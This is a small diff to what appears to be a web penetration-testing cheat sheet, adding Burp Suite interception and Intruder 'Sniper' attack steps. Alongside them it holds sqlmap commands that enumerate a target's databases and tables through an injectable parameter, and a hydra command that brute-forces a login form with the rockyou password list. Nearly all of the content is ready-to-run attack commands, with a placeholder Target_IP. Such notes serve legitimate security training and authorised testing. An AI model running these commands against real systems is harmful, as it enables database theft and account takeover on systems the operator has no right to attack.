@@ -42,6 +42,10 @@ $sqlmap -u http://Target_IP/listproducts.php?cat=1 –-dbs
 
 $sqlmap -u  http://Target_IP/listproducts.php?cat=1 –-dbs -D products –-tables
 
+Burp Suite > Proxy > Intercept > Intercept on
+
+Burp Suite > Intruder > Sniper attack > Positions Add > Payload Type = Simple list
+
 # 4° Brute Force
 
 $hydra -l user-name -P /usr/share/wordlists/rockyou.txt Target_IP http-post-form "/login.php:username=^USER^&password=^PASS^:Login Failed"
